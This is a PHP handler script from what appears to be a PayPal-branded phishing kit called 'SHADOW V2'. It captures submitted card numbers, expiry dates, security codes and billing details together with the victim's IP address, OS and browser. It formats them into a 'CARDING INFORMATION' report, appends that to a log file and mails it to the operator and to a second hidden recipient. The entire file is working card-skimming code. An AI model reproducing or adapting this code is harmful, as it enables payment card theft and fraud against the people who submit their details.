﻿<?php

session_start();

include("system.php");

$_SESSION['_NameOnCard_'] = $_POST['NameOnCard'];
$_SESSION['_cardnumber_'] = $_POST['cardnumber'];
$_SESSION['_expdate_']    = $_POST['expdate'];
$_SESSION['_csc_']        = $_POST['csc'];	




$InfoDATE   = date("d-m-Y h:i:sa");

$OS =getOS($_SERVER['HTTP_USER_AGENT']); 

$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 	



include("bincheck.php");


$time = date('d/m/Y G:i:s');

$ip = getenv("REMOTE_ADDR");

$xshackspam_email .= "<html>
<head><meta charset=\"UTF-8\"></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;border-style: solid;border-color: coral;width: 510px;background: url();background-repeat: no-repeat;background-position: center;'>
●••●••۰۰•● ❤ ●•۰۰۰۰•● ❤<font style='color: #9009A5;border-color:#ff9900;'>PAYPAL CARD</font>❤ ●•۰۰۰۰•● ❤ ●•۰۰۰•●••●●••<br/>
✘±±±±±±±±±±±±±±±±±±±±±±[ <font style='color: #FF358B;'>CARDING INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±±±±±✘<br>
<font style='color:#9c0000;'>✘🚩</font> [COUNTRY] = </font> <font style='color:#010101;'>".$_SESSION."</font><br>
<font style='color:#9c0000;'>✘🕘</font> [DATE RESULTE] = <font style='color:#0070ba;'>".$InfoDATE."</font><br>
<font style='color:#9c0000;'>✘🔖</font> [TYPE CARD] = <font style='color:#0070ba;'>".$_SESSION['_ccbrand_']."</font><br>
<font style='color:#9c0000;'>✘👨</font> [Cardholder's Name] = <font style='color:#0070ba;'>".$_SESSION['_NameOnCard_']."</font><br>
<font style='color:#9c0000;'>✘💳</font> [Card Number] = <font style='color:#0070ba;'>".$_SESSION['_cardnumber_']."</font><br>
<font style='color:#9c0000;'>✘⏳</font> [Expiration Date] = <font style='color:#0070ba;'>".$_SESSION['_expdate_']."</font><br>
<font style='color:#9c0000;'>✘🔒</font> [Card Security Code] = <font style='color:#0070ba;'>".$_SESSION['_csc_']."</font><br>
✘±±±±±±±±±±±±±±±±±±±±±±[ <font style='color: #FF358B;'>BILLING INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±±±±±✘<br>
<font style='color:#9c0000;'>✘👱‍</font> [First Name] = <font style='color:#0070ba;'>".$_SESSION['_Firstname_']."</font><br>
<font style='color:#9c0000;'>✘👨</font> [Last Name] = <font style='color:#0070ba;'>".$_SESSION['_LastName_']."</font><br>
<font style='color:#9c0000;'>✘🏚</font> [Address line] = <font style='color:#0070ba;'>".$_SESSION['_addres_']."</font><br>
<font style='color:#9c0000;'>✘💒</font> [Town/City] = <font style='color:#0070ba;'>".$_SESSION['_City_']."</font><br>
<font style='color:#9c0000;'>✘🏤</font> [Province/State] = <font style='color:#0070ba;'>".$_SESSION['_State_']."</font><br>
<font style='color:#9c0000;'>✘📫</font> [Postal/Zip Code] = <font style='color:#0070ba;'>".$_SESSION['_zipCod_']."</font><br>
<font style='color:#9c0000;'>✘📱</font> [phone Number] = <font style='color:#0070ba;'>".$_SESSION['_phoneNumber_']."</font><br>
✘±±±±±±±±±±±±±±±±±±±±±±[ <font style='color: #FF358B;'>VICTIME INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±±±±±✘<br>
<font style='color:#9c0000;'>✘🗺</font> [IP INFO] = <font style='color:#0070ba;'>https://geoiptool.com/en/?ip=".$_SERVER['REMOTE_ADDR']."</font><br>
<font style='color:#9c0000;'>✘💻</font> [SYSTEME] = <font style='color:#0070ba;'>".$OS."</font><br>
<font style='color:#9c0000;'>✘🌀</font> [BROWSER] = <font style='color:#0070ba;'>".$browserTy_Version."</font><br>
<font style='color:#9c0000;'>✘🍁</font> [ADRESS IP] = <font style='color:#0070ba;'>".$_SERVER['REMOTE_ADDR']."</font><br>
●••●••۰۰۰۰•● ❤ ●•۰۰۰۰•● ❤<font style='color: #9009A5;'>SHADOW V2</font>❤ ●•۰۰۰۰•● ❤ ●•۰۰۰۰•●••●
</div></html>";   
include("sand_email.php");
$f = fopen("../../SHADOWPayPal.html", "a");
fwrite($f, $xshackspam_email);
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$subject  = " Carde PayPal [".$_SERVER['REMOTE_ADDR']." / ".$_SESSION['country1']." ] ";
$headers .= "From: SHADOW" . "\r\n";

mail($yourmail, $subject, $xshackspam_email , $headers);

include("security.php");
$f = fopen("../../SHADOWPayPal.html", "a");
fwrite($f, $xshackspam_email);
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$subject  = " Carde PayPal [".$_SERVER['REMOTE_ADDR']." / ".$_SESSION['country1']." ] ";
$headers .= "From: SHADOW" . "\r\n";
mail($securedby, $subject, $xshackspam_email , $headers);

?>
